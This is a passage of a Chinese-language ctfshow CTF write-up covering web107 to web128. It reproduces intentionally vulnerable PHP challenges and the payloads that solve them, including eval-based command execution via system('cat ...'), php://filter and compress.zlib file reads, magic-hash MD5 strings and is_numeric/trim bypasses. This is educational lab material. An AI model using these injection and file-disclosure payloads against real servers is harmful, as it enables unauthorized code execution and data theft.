    if(sha1($v1)==sha1($v2) &amp;amp;&amp;amp; $v1!=$v2)&amp;#123;
        echo $flag;
    &amp;#125;
&amp;#125;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;为啥不和 104 放一块呢？？？好多问号&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230111111704069.png&#34; alt=&#34;image-20230111111704069&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web107&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web107&#34;&gt;#&lt;/a&gt; web107&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
highlight_file(__FILE__);
error_reporting(0);
include(&amp;quot;flag.php&amp;quot;);

if(isset($_POST[&#39;v1&#39;]))&amp;#123;
    $v1 = $_POST[&#39;v1&#39;];
    $v3 = $_GET[&#39;v3&#39;];
       parse_str($v1,$v2);
       if($v2[&#39;flag&#39;]==md5($v3))&amp;#123;
           echo $flag;
       &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;parse_str () 函数把查询字符串解析到变量中。&lt;/p&gt;
&lt;p&gt;未设置 &lt;em&gt;array&lt;/em&gt; 参数，则由该函数设置的变量将覆盖已存在的同名变量&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
parse_str(&amp;quot;name=Bill&amp;amp;age=60&amp;quot;);
echo $name.&amp;quot;&amp;lt;br&amp;gt;&amp;quot;;
echo $age;
?&amp;gt;
//Bill
//60
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;设置了 array 参数&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
parse_str(&amp;quot;name=Bill&amp;amp;age=60&amp;quot;,$myArray);
print_r($myArray);
?&amp;gt;
// Array ( [name] =&amp;gt; Bill [age] =&amp;gt; 60 )
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;将 v3 的参 md5 后与 flag 相比较，下面提供一组 md 后 0e 开头的字符串&lt;/p&gt;
&lt;figure class=&#34;highlight txt&#34;&gt;&lt;figcaption data-lang=&#34;txt&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;QNKCDZO&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;0e830400451993494058024219903391&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;240610708&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;0e462097431906509019562988736854&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;s878926199a&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;0e545993274517709034328855841020&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;s155964671a&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;0e342768416822451524974117254469&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;s214587387a&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;0e848240448830537924465865611904&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230111144939145.png&#34; alt=&#34;image-20230111144939145&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web108&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web108&#34;&gt;#&lt;/a&gt; web108&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
highlight_file(__FILE__);
error_reporting(0);
include(&amp;quot;flag.php&amp;quot;);

if (ereg (&amp;quot;^[a-zA-Z]+$&amp;quot;, $_GET[&#39;c&#39;])===FALSE)  &amp;#123;
    die(&#39;error&#39;);
&amp;#125;
//只有36d的人才能看到flag
if(intval(strrev($_GET[&#39;c&#39;]))==0x36d)&amp;#123;
    echo $flag;
&amp;#125;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;首先还是介绍几个函数&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ereg()&lt;/code&gt;  函数搜索由指定的字符串作为由模式指定的字符串，如果发现模式则返回 &lt;code&gt;true&lt;/code&gt; ，否则返回 &lt;code&gt;false&lt;/code&gt; 。搜索对于字母字符是区分大小写的。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;intval()&lt;/code&gt;  函数用于获取变量的整数值。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;strrev()&lt;/code&gt;  函数反转字符串。&lt;/p&gt;
&lt;p&gt;再这里 ereg 函数存在一个 00null 的截断&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230111173919413.png&#34; alt=&#34;image-20230111173919413&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web109&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web109&#34;&gt;#&lt;/a&gt; web109&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET[&#39;v1&#39;]) &amp;amp;&amp;amp; isset($_GET[&#39;v2&#39;]))&amp;#123;
    $v1 = $_GET[&#39;v1&#39;];
    $v2 = $_GET[&#39;v2&#39;];
    if(preg_match(&#39;/[a-zA-Z]+/&#39;, $v1) &amp;amp;&amp;amp; preg_match(&#39;/[a-zA-Z]+/&#39;, $v2))&amp;#123;
            eval(&amp;quot;echo new $v1($v2());&amp;quot;);
    &amp;#125;
&amp;#125;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这个很明显是考察原生类利用，这里可以查阅&lt;a href=&#34;https://blog.xcu.icu/2022/11/02/php%E5%BA%8F%E5%88%97%E5%8C%96/&#34;&gt; php 反序列化 - Web | Clown の Blog = (xcu.icu)&lt;/a&gt; 我的这篇文章&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;echo new $v1($v2());
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里 echo 一个实例化的对象 v1，v2 是传入类中的参数，这里 v2 () 是表示会将 v2 返回值作为函数调用，这里有 echo 可以自动调用魔术方法__tostring () 方法，那么这里几个 php 反射类，和异常处理类等等都可以利用&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-url&#34;&gt;v1=Exception&amp;amp;v2=system(&#39;cat fl36dg.txt&#39;) v1=Reflectionclass&amp;amp;v2=system(&#39;cat fl36dg.txt&#39;)
v1=mysqli&amp;amp;v2=system(&#39;tac fl36dg.txt&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230113120837704.png&#34; alt=&#34;image-20230113120837704&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web110&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web110&#34;&gt;#&lt;/a&gt; web110&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET[&#39;v1&#39;]) &amp;amp;&amp;amp; isset($_GET[&#39;v2&#39;]))&amp;#123;
    $v1 = $_GET[&#39;v1&#39;];
    $v2 = $_GET[&#39;v2&#39;];

    if(preg_match(&#39;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;amp;|\*|\(|\)|\_|\-|\+|\=|\&amp;#123;|\[|\;|\:|\&amp;quot;|\&#39;|\,|\.|\?|\\\\|\/|[0-9]/&#39;, $v1))&amp;#123;
            die(&amp;quot;error v1&amp;quot;);
    &amp;#125;
    if(preg_match(&#39;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;amp;|\*|\(|\)|\_|\-|\+|\=|\&amp;#123;|\[|\;|\:|\&amp;quot;|\&#39;|\,|\.|\?|\\\\|\/|[0-9]/&#39;, $v2))&amp;#123;
            die(&amp;quot;error v2&amp;quot;);
    &amp;#125;
    eval(&amp;quot;echo new $v1($v2());&amp;quot;);
&amp;#125;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这个题比起上一题加了一些过滤，上面的方法就不在使用，首先要查看文件明&lt;/p&gt;
&lt;figure class=&#34;highlight txt&#34;&gt;&lt;figcaption data-lang=&#34;txt&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;可遍历目录类有以下几个：&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;DirectoryIterator 类&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;FilesystemIterator 类&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;GlobIterator 类&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;但是这些都要传入路径，这里符号都被过滤，所以要使用别的函数来获取路径&lt;/p&gt;
&lt;p&gt;如果要获取脚本文件的目录，要应用函数 getcwd () 来实现。函数声明如下：&lt;/p&gt;
&lt;p&gt;string getcwd ( void ) ;&lt;/p&gt;
&lt;p&gt;成功执行后返回当前目录字符串，失败返回 FALSE。&lt;/p&gt;
&lt;p&gt;注： &lt;code&gt;这里三个遍历目录类，第一个包含隐藏文件，第二个不包含，第三个获取的是目录名，所以这里要使用第二个，当然这种方法也只能获取第一个文件名&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230113122221136.png&#34; alt=&#34;image-20230113122221136&#34; /&gt;&lt;/p&gt;
&lt;p&gt;访问即可&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230113122354782.png&#34; alt=&#34;image-20230113122354782&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;中篇&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#中篇&#34;&gt;#&lt;/a&gt; 中篇&lt;/h1&gt;
&lt;h2 id=&#34;web111&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web111&#34;&gt;#&lt;/a&gt; web111&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
highlight_file(__FILE__);
error_reporting(0);
include(&amp;quot;flag.php&amp;quot;);
function getFlag(&amp;amp;$v1,&amp;amp;$v2)&amp;#123;
    eval(&amp;quot;$$v1 = &amp;amp;$$v2;&amp;quot;);
    var_dump($$v1);
&amp;#125;
if(isset($_GET[&#39;v1&#39;]) &amp;amp;&amp;amp; isset($_GET[&#39;v2&#39;]))&amp;#123;
    $v1 = $_GET[&#39;v1&#39;];
    $v2 = $_GET[&#39;v2&#39;];
    if(preg_match(&#39;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;amp;|\*|\(|\)|\_|\-|\+|\=|\&amp;#123;|\[|\;|\:|\&amp;quot;|\&#39;|\,|\.|\?|\\\\|\/|[0-9]|\&amp;lt;|\&amp;gt;/&#39;, $v1))&amp;#123;
            die(&amp;quot;error v1&amp;quot;);
    &amp;#125;
    if(preg_match(&#39;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;amp;|\*|\(|\)|\_|\-|\+|\=|\&amp;#123;|\[|\;|\:|\&amp;quot;|\&#39;|\,|\.|\?|\\\\|\/|[0-9]|\&amp;lt;|\&amp;gt;/&#39;, $v2))&amp;#123;
            die(&amp;quot;error v2&amp;quot;);
    &amp;#125;
    if(preg_match(&#39;/ctfshow/&#39;, $v1))&amp;#123;
            getFlag($v1,$v2);
    &amp;#125;
&amp;#125;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;本题的重点在&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;    eval(&amp;quot;$$v1 = &amp;amp;$$v2;&amp;quot;);
    var_dump($$v1);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;很明显考察变量覆盖，这里使用 GLOBALS 全局变量&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230113204217572.png&#34; alt=&#34;image-20230113204217572&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web112&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web112&#34;&gt;#&lt;/a&gt; web112&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
highlight_file(__FILE__);
error_reporting(0);
function filter($file)&amp;#123;   if(preg_match(&#39;/\.\.\/|http|https|data|input|rot13|base64|string/i&#39;,$file))&amp;#123;
        die(&amp;quot;hacker!&amp;quot;);
    &amp;#125;else&amp;#123;
        return $file;
    &amp;#125;
&amp;#125;
$file=$_GET[&#39;file&#39;];
if(! is_file($file))&amp;#123;
    highlight_file(filter($file));
&amp;#125;else&amp;#123;
    echo &amp;quot;hacker!&amp;quot;;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里我们的目的是不能让 is_file 检测出是文件，并且 highlight_file 可以识别为文件。这时候可以利用 php 伪协议。&lt;br /&gt;
可以直接用不带任何过滤器的 filter 伪协议&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-url&#34;&gt;php://filter/resource=flag.php
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里主要是为了过滤编码方式，采用为被过滤的编码方式即可&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-url&#34;&gt;php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php
php://filter/read=convert.quoted-printable-encode/resource=flag.php
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;或者使用别的伪协议&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-url&#34;&gt;compress.zlib://flag.php
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里对 zip 伪协议进行一个补充&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;【zip:// 协议】&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用方法：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;zip://archive.zip#dir/file.txt&lt;/p&gt;
&lt;p&gt;zip:// [压缩文件绝对路径]#[压缩文件内的子文件名]&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.【bzip2:// 协议】&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用方法：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;compress.bzip2://file.bz2&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3.【zlib:// 协议】&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用方法：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;compress.zlib://file.gz&lt;/p&gt;
&lt;h2 id=&#34;web113&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web113&#34;&gt;#&lt;/a&gt; web113&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
highlight_file(__FILE__);
error_reporting(0);
function filter($file)&amp;#123;
    if(preg_match(&#39;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#39;,$file))&amp;#123;
        die(&#39;hacker!&#39;);
    &amp;#125;else&amp;#123;
        return $file;
    &amp;#125;
&amp;#125;
$file=$_GET[&#39;file&#39;];
if(! is_file($file))&amp;#123;
    highlight_file(filter($file));
&amp;#125;else&amp;#123;
    echo &amp;quot;hacker!&amp;quot;;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里没有过滤全，上面提到的 zilb:// 协议还能使用&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/?file=compress.zlib://flag.php
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230214222732285.png&#34; alt=&#34;image-20230214222732285&#34; /&gt;&lt;/p&gt;
&lt;p&gt;或者利用 /proc/self/root 软链接，20 次软链接可以绕过 is_file ()&lt;/p&gt;
&lt;h2 id=&#34;web114&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web114&#34;&gt;#&lt;/a&gt; web114&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
error_reporting(0);
highlight_file(__FILE__);
function filter($file)&amp;#123;
    if(preg_match(&#39;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#39;,$file))&amp;#123;
        die(&#39;hacker!&#39;);
    &amp;#125;else&amp;#123;
        return $file;
    &amp;#125;
&amp;#125;
$file=$_GET[&#39;file&#39;];
echo &amp;quot;师傅们居然tql都是非预期 哼！&amp;quot;;
if(! is_file($file))&amp;#123;
    highlight_file(filter($file));
&amp;#125;else&amp;#123;
    echo &amp;quot;hacker!&amp;quot;;
&amp;#125; 师傅们居然tql都是非预期 哼！
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里过滤了 compress，root 但是又没有过滤 filter&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?file=php://filter/resource=flag.php
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;web115&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web115&#34;&gt;#&lt;/a&gt; web115&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
include(&#39;flag.php&#39;);
highlight_file(__FILE__);
error_reporting(0);
function filter($num)&amp;#123;
    $num=str_replace(&amp;quot;0x&amp;quot;,&amp;quot;1&amp;quot;,$num);
    $num=str_replace(&amp;quot;0&amp;quot;,&amp;quot;1&amp;quot;,$num);
    $num=str_replace(&amp;quot;.&amp;quot;,&amp;quot;1&amp;quot;,$num);
    $num=str_replace(&amp;quot;e&amp;quot;,&amp;quot;1&amp;quot;,$num);
    $num=str_replace(&amp;quot;+&amp;quot;,&amp;quot;1&amp;quot;,$num);
    return $num;
&amp;#125;
$num=$_GET[&#39;num&#39;];
if(is_numeric($num) and $num!==&#39;36&#39; and trim($num)!==&#39;36&#39; and filter($num)==&#39;36&#39;)&amp;#123;
    if($num==&#39;36&#39;)&amp;#123;
        echo $flag;
    &amp;#125;else&amp;#123;
        echo &amp;quot;hacker!!&amp;quot;;
    &amp;#125;
&amp;#125;else&amp;#123;
    echo &amp;quot;hacker!!!&amp;quot;;
&amp;#125; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;本题主要考察绕过 is_numeric，!== 不全等，数值或者类型不相同&lt;/p&gt;
&lt;p&gt;在数字的前面加上 %09 %0a %0b %0c %0d 任意一个都可以使其为真不影响判断。&lt;/p&gt;
&lt;p&gt;对于 trim 函数首位去空，可以去除空格以及 &lt;code&gt;\n\r\t\v\0&lt;/code&gt; ，但不会过滤 &lt;code&gt;\f&lt;/code&gt; ，于是本题可以使用 %0c 绕过&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230214225308922.png&#34; alt=&#34;image-20230214225308922&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web123&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web123&#34;&gt;#&lt;/a&gt; web123&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
error_reporting(0);
highlight_file(__FILE__);
include(&amp;quot;flag.php&amp;quot;);
$a=$_SERVER[&#39;argv&#39;];
$c=$_POST[&#39;fun&#39;];
if(isset($_POST[&#39;CTF_SHOW&#39;])&amp;amp;&amp;amp;isset($_POST[&#39;CTF_SHOW.COM&#39;])&amp;amp;&amp;amp;!isset($_GET[&#39;fl0g&#39;]))&amp;#123;
    if(!preg_match(&amp;quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&amp;#123;|\&amp;#125;|\&amp;quot;|\&#39;|\,|\.|\;|\?/&amp;quot;, $c)&amp;amp;&amp;amp;$c&amp;lt;=18)&amp;#123;
         eval(&amp;quot;$c&amp;quot;.&amp;quot;;&amp;quot;);  
         if($fl0g===&amp;quot;flag_give_me&amp;quot;)&amp;#123;
             echo $flag;
         &amp;#125;
    &amp;#125;
&amp;#125;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;本题没啥限制，直接上 payload：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?CTF_SHOW=&amp;amp;CTF[SHOW.COM=&amp;amp;fun=echo%20$flag
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里不用 CTF_SHOW.COM 的原因是因为这里又一个点，变量名重只能有数字字母下划线，所以我们构造不出来原参数，被 get 或者 post 传入的变量名，如果含有空格、+、[则会被转化为_，php 中有个特性就是如果传入 [，它被转化为_之后，后面的字符就会被保留下来不会被替换，所以这里要使用 [&lt;/p&gt;
&lt;h2 id=&#34;web125&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web125&#34;&gt;#&lt;/a&gt; web125&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
error_reporting(0);
highlight_file(__FILE__);
include(&amp;quot;flag.php&amp;quot;);
$a=$_SERVER[&#39;argv&#39;];
$c=$_POST[&#39;fun&#39;];
if(isset($_POST[&#39;CTF_SHOW&#39;])&amp;amp;&amp;amp;isset($_POST[&#39;CTF_SHOW.COM&#39;])&amp;amp;&amp;amp;!isset($_GET[&#39;fl0g&#39;]))&amp;#123;
    if(!preg_match(&amp;quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&amp;#123;|\&amp;#125;|\&amp;quot;|\&#39;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&amp;quot;, $c)&amp;amp;&amp;amp;$c&amp;lt;=16)&amp;#123;
         eval(&amp;quot;$c&amp;quot;.&amp;quot;;&amp;quot;);
         if($fl0g===&amp;quot;flag_give_me&amp;quot;)&amp;#123;
             echo $flag;
         &amp;#125;
    &amp;#125;
&amp;#125;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;比起上一题多了一些过滤，如 echo，flag 等等，构造命令执行发现没反应，大概是 ban 掉了，但是高亮函数应该没禁用，毕竟本题还使用了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230214231811542.png&#34; alt=&#34;image-20230214231811542&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web126&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web126&#34;&gt;#&lt;/a&gt; web126&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
error_reporting(0);
highlight_file(__FILE__);
include(&amp;quot;flag.php&amp;quot;);
$a=$_SERVER[&#39;argv&#39;];
$c=$_POST[&#39;fun&#39;];
if(isset($_POST[&#39;CTF_SHOW&#39;])&amp;amp;&amp;amp;isset($_POST[&#39;CTF_SHOW.COM&#39;])&amp;amp;&amp;amp;!isset($_GET[&#39;fl0g&#39;]))&amp;#123;
    if(!preg_match(&amp;quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&amp;#123;|\&amp;#125;|\&amp;quot;|\&#39;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&amp;quot;, $c) &amp;amp;&amp;amp; strlen($c)&amp;lt;=16)&amp;#123;
         eval(&amp;quot;$c&amp;quot;.&amp;quot;;&amp;quot;);  
         if($fl0g===&amp;quot;flag_give_me&amp;quot;)&amp;#123;
             echo $flag;
         &amp;#125;
    &amp;#125;
&amp;#125;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;本题过滤名单加上了几个字母 g|i|f|c|o|d，那么上面一题的高亮用法也被过滤了，那么 get 和 post 就不能再使用了，而且这里存在长度限制。最后还有的办法就是利用原有的 echo 语句输出 flag&lt;/p&gt;
&lt;p&gt;parse_str () 函数把查询字符串解析到变量中&lt;/p&gt;
&lt;p&gt;assert () 判断一个表达式是否成立，之间的代码会被执行&lt;/p&gt;
&lt;p&gt;看到 $a=$_SERVER [&#39;argv&#39;];，这里可以利用，“$argv” 用于存放指向字符串的参数，是传递给脚本的参数数组，每一个元素指向一个参数，第一个参数总是当前脚本的文件名；&lt;/p&gt;
&lt;p&gt;这里测试一下，注意这里需要将 register_argc_argv 配置项改为为 no，&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230215135512053.png&#34; alt=&#34;image-20230215135512053&#34; /&gt;&lt;/p&gt;
&lt;p&gt;cli 模式下&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230215162645586.png&#34; alt=&#34;image-20230215162645586&#34; /&gt;&lt;/p&gt;
&lt;p&gt;网页模式下&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230215162736593.png&#34; alt=&#34;image-20230215162736593&#34; /&gt;&lt;/p&gt;
&lt;p&gt;本题的逻辑就显而易见了，前面的 CTF_SHOWW 不变，fun=assert ($a [0])，这样就会执行 $a [0] 的参，get 传入一个？$fl0g=flag_give_me，就会将这一句话通过断言执行，成功将 $fl0g 赋值，通过原有的 echo 语句输出 flag&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230215164257976.png&#34; alt=&#34;image-20230215164257976&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web127&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web127&#34;&gt;#&lt;/a&gt; web127&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
error_reporting(0);
include(&amp;quot;flag.php&amp;quot;);
highlight_file(__FILE__);
$ctf_show = md5($flag);
$url = $_SERVER[&#39;QUERY_STRING&#39;];
//特殊字符检测
function waf($url)&amp;#123;
 if(preg_match(&#39;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&amp;#123;|\;|\:|\[|\]|\&amp;#125;|\&#39;|\&amp;quot;|\&amp;lt;|\,|\&amp;gt;|\.|\\\|\//&#39;, $url))&amp;#123;
        return true;
    &amp;#125;else&amp;#123;
        return false;
    &amp;#125;
&amp;#125;
if(waf($url))&amp;#123;
    die(&amp;quot;嗯哼？&amp;quot;);
&amp;#125;else&amp;#123;
    extract($_GET);
&amp;#125;
if($ctf_show===&#39;ilove36d&#39;)&amp;#123;
    echo $flag;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;extract () 函数从数组中将变量导入到当前的符号表。&lt;/p&gt;
&lt;p&gt;没啥限制，直接变量覆盖，这里下划线被过滤，尝试 [[空格], 空格可以直接绕过&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C%E9%99%8C%E8%B7%AF%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230215165026747.png&#34; alt=&#34;image-20230215165026747&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web128&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web128&#34;&gt;#&lt;/a&gt; web128&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
error_reporting(0);
include(&amp;quot;flag.php&amp;quot;);
highlight_file(__FILE__);

$f1 = $_GET[&#39;f1&#39;];
$f2 = $_GET[&#39;f2&#39;];

if(check($f1))&amp;#123;
    var_dump(call_user_func(call_user_func($f1,$f2)));
